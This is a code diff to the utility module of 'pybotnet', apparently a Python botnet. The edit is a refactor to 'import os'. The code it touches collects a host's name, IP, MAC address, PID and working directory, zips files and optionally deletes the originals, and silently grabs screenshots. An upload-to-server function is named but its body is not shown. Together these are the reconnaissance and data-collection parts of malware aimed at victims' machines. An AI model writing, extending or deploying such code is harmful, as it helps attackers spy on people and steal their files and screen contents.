@@ -9,8 +9,8 @@ import json
 import platform
 import time
 import zipfile
+import os
 
-from os import getcwd, getpid, path, remove
 from socket import gethostname, gethostbyname
 from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
@@ -83,8 +83,8 @@ def get_full_system_info(pybotnet_uptime=None) -> str:
     full_system_info = f"""{get_short_system_info()}
 pybotnet up time: {pybotnet_uptime} Seconds
 local ip: {get_host_name_ip()}
-current route: {getcwd()}
-pid: {getpid()}
+current route: {os.getcwd()}
+pid: {os.getpid()}
 pybotnet version: {settings.pybotnet_version}
 -----------------------"""
 
@@ -277,22 +277,22 @@ def make_zip_file(route, logger, delete_input_file=False):
     '''
 
     # input: /home/onion/text.py ooutput: text.zip
-    new_file_name = path.splitext(path.basename(route))[0]
+    new_file_name = os.path.splitext(os.path.basename(route))[0]
     new_file_name = f'{new_file_name}.zip'
 
-    if not path.isfile(route):
+    if not os.path.isfile(route):
         logger.error('make_zip_file: is not a file')
         return False, 'make_zip_file: is not a file'
 
     try:
         with zipfile.ZipFile(new_file_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
-            zf.write(route, path.basename(route))
+            zf.write(route, os.path.basename(route))
 
         logger.info(
             f'make_zip_file: The file was successfully zipped, file name {new_file_name}')
 
         if delete_input_file:
-            remove(route)
+            os.remove(route)
 
         return True, new_file_name
 
@@ -382,7 +382,7 @@ def upload_server_1(file: bytes, file_name: str, logger, time_out: int = 1200, f
 def screenshot_pil(logger, route: str = ''):
     '''get a sreenshot and save to file , return file name or False'''
     try:
-        file_name = str(int(get_current_epoc_time()))
+        file_name = str(get_current_epoc_time()).replace('.', '_')
         file = open(f'{route}{file_name}.png', 'wb')
 
         screenshot = ImageGrab.grab()
